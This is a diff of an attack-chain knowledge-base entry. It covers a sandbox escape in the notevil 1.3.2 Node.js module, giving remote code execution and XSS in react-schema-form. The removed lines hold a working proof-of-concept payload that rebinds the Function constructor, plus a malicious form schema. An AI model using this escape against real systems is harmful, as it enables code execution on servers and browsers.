@@ -1,42 +1,42 @@
 ---
-id: ac-notevil-sandbox-escape-rce-xss
+id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+name: Sandbox Escape in notevil Module Leading to RCE in Node.js and XSS in Browser
+type: attack_chain
+description: >-
+  Multi-stage exploitation of a sandbox escape vulnerability in the notevil
+  Node.js module, enabling arbitrary JavaScript execution for remote code
+  execution (RCE) on the server or cross-site scripting (XSS) in the browser via
+  dependent packages like react-schema-form.
+verified: false
+submitted: true
+step_count: 4
+created_at: '2023-10-01T00:00:00Z'
+updated_at: '2025-12-14T17:23:24.410Z'
+procedures:
+  - '[[procedures/Load-notevil-Module-for-SafeEval]]'
+  - '[[procedures/Craft-Malicious-JavaScript-for-Sandbox-Escape]]'
+  - '[[procedures/Execute-Sandbox-Escape-Payload-in-Node.js]]'
+  - '[[procedures/Exploit-XSS-in-react-schema-form]]'
+techniques:
+  - '[[JavaScript]]'
+  - '[[Drive-by Compromise]]'
+tactics:
+  - '[[Execution]]'
+  - '[[Collection]]'
 tags:
   - sandbox-escape
   - rce
   - xss
   - nodejs
   - javascript
-  - notevil
-type: attack_chain
-tools:
-  - '[[tools/RunKit]]'
-  - '[[tools/notevil]]'
-  - '[[tools/esprima]]'
-tactics:
-  - '[[Execution]]'
-  - '[[Collection]]'
-verified: false
 platforms:
   - Node.js
   - Web
-submitted: true
-created_at: '2023-10-01T00:00:00Z'
-procedures:
-  - '[[procedures/Load-Vulnerable-notevil-Module-in-Node.js]]'
-  - '[[procedures/Construct-Malicious-Payload-for-Sandbox-Bypass]]'
-  - '[[procedures/Execute-Payload-to-Achieve-RCE-in-Node.js]]'
-  - '[[procedures/Exploit-Vulnerability-in-Browser-Dependent-Application]]'
-  - '[[procedures/Trigger-XSS-with-Malicious-Form-Schema]]'
-step_count: 5
-techniques:
-  - '[[JavaScript]]'
-  - '[[Drive-by Compromise]]'
-updated_at: '2025-12-14T03:16:08.463Z'
-description: >-
-  Multi-stage attack exploiting a sandbox escape vulnerability in the notevil
-  Node.js module (v1.3.2) to achieve remote code execution in Node.js
-  environments and cross-site scripting in browser-based applications like
-  react-schema-form.
+tools:
+  - '[[tools/notevil]]'
+  - '[[tools/esprima]]'
+  - '[[tools/runkit]]'
+  - '[[tools/react-schema-form]]'
 validated: true
 mitre_tactics:
   - '[[Execution]]'
@@ -45,16 +45,17 @@ mitre_techniques:
   - '[[JavaScript]]'
   - '[[Drive-by Compromise]]'
 ---
+
 # Sandbox Escape in notevil Module Leading to RCE in Node.js and XSS in Browser
 
-Multi-stage attack chain demonstrating a sandbox escape in the notevil Node.js module (version 1.3.2), bypassing previous fixes to execute arbitrary JavaScript outside the sandbox. This leads to remote code execution (RCE) in Node.js environments and cross-site scripting (XSS) in browser contexts, such as applications depending on notevil like react-schema-form.
+Multi-stage attack chain demonstrating exploitation of the notevil module's sandbox escape vulnerability (version 1.3.2), allowing bypass of AST-based restrictions to access global objects, load Node.js modules for RCE, or inject scripts for XSS in browser contexts like react-schema-form.
 
 ## Chain Metrics Dashboard
 
 | Metric | Value |
 |--------|-------|
 | Chain Status | Unverified |
-| Total Steps | 5 |
+| Total Steps | 4 |
 | Execution Time | ~5 minutes |
 | Skill Level | Intermediate |
 | Complexity | Medium |
@@ -64,10 +65,10 @@ Multi-stage attack chain demonstrating a sandbox escape in the notevil Node.js m
 
 ```mermaid
 graph LR
-    A[Load Vulnerable Module] --> B[Construct Payload]
-    B --> C[Execute for RCE]
-    C --> D[Target Browser App]
-    D --> E[Trigger XSS]
+    A[Load notevil Module] --> B[Craft Malicious Payload]
+    B --> C[Execute in Node.js for RCE]
+    C --> D[Adapt for Browser XSS]
+    D --> E[Arbitrary Code Execution]
 
     style A fill:#e74c3c
     style B fill:#f39c12
@@ -80,141 +81,99 @@ graph LR
 
 ### Required Tools
 
-- [[tools/RunKit]]
 - [[tools/notevil]]
+- [[tools/runkit]]
+- [[tools/react-schema-form]]
 
 ### Target Environment
 
-- Node.js runtime (for RCE)
-- Web browser (for XSS)
-- Dependent package like react-schema-form
+- Node.js runtime (version compatible with notevil 1.3.2)
+- Browser environment for XSS (e.g., react-schema-form demo)
+- npm for package installation
 
 ### Initial Access Requirements
 
-- Access to a Node.js environment with notevil v1.3.2 installed via npm
-- Ability to visit and interact with vulnerable web applications
+- Access to a Node.js environment or browser demo page
+- No specific credentials required; assumes developer or testing context
+- Network access to npm registry and demo sites
 
 ## Detailed Attack Procedures
 
-### Step 1: Load Vulnerable Module
-procedure: [[procedures/Load-Vulnerable-notevil-Module-in-Node.js]]
+### Step 1: Load notevil Module
 
-**Objective**: Import the vulnerable notevil module to access the safeEval function for sandboxed evaluation.
+procedure: [[procedures/Load-notevil-Module-for-SafeEval]]
 
-**Instructions**: Install and require the notevil module version 1.3.2 in a Node.js script.
+**Objective**: Import the vulnerable notevil module to obtain the safeEval function for restricted JavaScript evaluation.
 
-```javascript
-npm install notevil@1.3.2
-```
+**Instructions**: Install and require the notevil module using npm in a Node.js script.
 
-Then load it:
-
-```javascript
-var safeEval = require('notevil');
-```
-
-**Expected Output**: safeEval function available for use.
+**Expected Output**: safeEval function loaded successfully.
 
 **Success Indicators**:
-- Module loads without errors
-- safeEval is defined
+- Module requires without errors
+- safeEval function is available for use
 
-### Step 2: Construct Malicious Payload
-procedure: [[procedures/Construct-Malicious-Payload-for-Sandbox-Bypass]]
+### Step 2: Craft Malicious JavaScript
 
-**Objective**: Build a JavaScript string that manipulates function prototypes to bypass the sandbox and reconstruct the Function constructor.
+procedure: [[procedures/Craft-Malicious-JavaScript-for-Sandbox-Escape]]
 
-**Instructions**: Define the payload string targeting constructor properties.
+**Objective**: Construct a JavaScript payload that bypasses the sandbox by manipulating function prototypes to access and bind the Function constructor.
 
-```javascript
-var code = 'function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, "return this.process.mainModule.constructor._load(`util`).log(`pwned`)")}).pop();(Func())()';
-```
+**Instructions**: Define the code string that uses Object.getOwnPropertyDescriptors on fn.__proto__.constructor to extract and rebind properties, enabling execution of arbitrary code like loading the 'util' module.
 
-**Expected Output**: Payload string ready for evaluation.
+**Expected Output**: Valid JavaScript string ready for evaluation.
 
 **Success Indicators**:
-- Payload string constructed without syntax errors
+- Payload string is syntactically correct
+- No parsing errors when inspected
 
-### Step 3: Execute Payload for RCE
-procedure: [[procedures/Execute-Payload-to-Achieve-RCE-in-Node.js]]
+### Step 3: Execute in Node.js for RCE
 
-**Objective**: Pass the payload to safeEval to escape the sandbox and execute arbitrary code, such as logging via the util module.
+procedure: [[procedures/Execute-Sandbox-Escape-Payload-in-Node.js]]
 
-**Instructions**: Use [[commands/notevil-sandbox-escape-poc-nodejs]] in a Node.js environment like RunKit.
+**Objective**: Evaluate the crafted payload using safeEval to escape the sandbox and achieve RCE, such as logging via the util module.
 
-```javascript
-console.log(safeEval(code));
-```
+**Instructions**: Pass the payload to safeEval and log the result in a Node.js console.
 
-**Expected Output**: 'pwned' logged to console via util.log.
+**Expected Output**: 'pwned' logged to console, indicating successful module load and execution outside the sandbox.
 
 **Success Indicators**:
-- Arbitrary code executes outside sandbox
 - Console output shows 'pwned'
+- No sandbox restrictions prevent global access
 
-### Step 4: Target Browser-Dependent Application
-procedure: [[procedures/Exploit-Vulnerability-in-Browser-Dependent-Application]]
+### Step 4: Exploit XSS in Browser
 
-**Objective**: Identify and access a web application using the vulnerable notevil module, such as react-schema-form.
+procedure: [[procedures/Exploit-XSS-in-react-schema-form]]
 
-**Instructions**: Navigate to the application demo site.
+**Objective**: Adapt the payload for browser execution in react-schema-form, injecting it into form conditions to trigger XSS.
 
-```javascript
-// No command; manual browser action
-window.location.href = 'https://networknt.github.io/react-schema-form/';
-```
+**Instructions**: Configure the form JSON with the malicious condition and schema requiring the field, then submit to render and execute the alert.
 
-**Expected Output**: Application loads, allowing form configuration.
+**Expected Output**: Alert popup displaying 'pwned ' in the browser.
 
 **Success Indicators**:
-- Site accessible
-- Form builder interface available
-
-### Step 5: Trigger XSS with Malicious Schema
-procedure: [[procedures/Trigger-XSS-with-Malicious-Form-Schema]]
-
-**Objective**: Configure a malicious JSON schema and form to trigger the sandbox escape in the browser, executing an alert.
-
-**Instructions**: Use [[commands/react-schema-form-xss-payload]] and [[commands/react-schema-form-schema]] in the form builder.
-
-Set form:
-
-```json
-[ { "key": "comments", "condition": "function fn() {};var constructorProperty = Object.getOwnPropertyDescriptors(fn.__proto__.constructor);var properties = Object.values(constructorProperty);properties.pop();properties.pop();properties.pop();var Func = properties.map(function (x) {return x.bind(x, 'return this.alert(`pwned `)')}).pop();(Func())()", "type": "radios", "titleMap": [ { "value": "S", "name": "Shipping" }, { "value": "P", "name": "Pickup" } ] } ]
-```
-
-Set schema:
-
-```json
-{ "type": "object", "required": [ "comments" ] }
-```
-
-**Expected Output**: Alert box pops up with 'pwned'.
-
-**Success Indicators**:
-- Alert executes in browser
-- Arbitrary JS runs
+- Form renders without errors
+- Alert executes on submission
 
 ## Attack Chain Summary
 
 ### Key Achievements
 
-1. Bypassed notevil sandbox via prototype manipulation
-2. Achieved RCE in Node.js by loading and executing util module
-3. Triggered XSS in browser-dependent apps like react-schema-form
+1. Bypassed notevil's AST-based sandbox restrictions using prototype manipulation.
+2. Achieved RCE in Node.js by loading and executing modules like util.
+3. Demonstrated XSS in browser-dependent packages via user-controlled form fields.
 
 ## Technique & Tactic Coverage
 
 ### MITRE ATT&CK Techniques
 
-- [[JavaScript]]
-- [[Drive-by Compromise]]
+- [[JavaScript]] JavaScript
+- [[Drive-by Compromise]] Drive-by Compromise
 
 ### MITRE ATT&CK Tactics
 
-- [[Execution]]
-- [[Collection]]
+- [[Execution]] Execution
+- [[Collection]] Collection
 
 ---
-
 *Last updated: 2023-10-01T00:00:00Z*
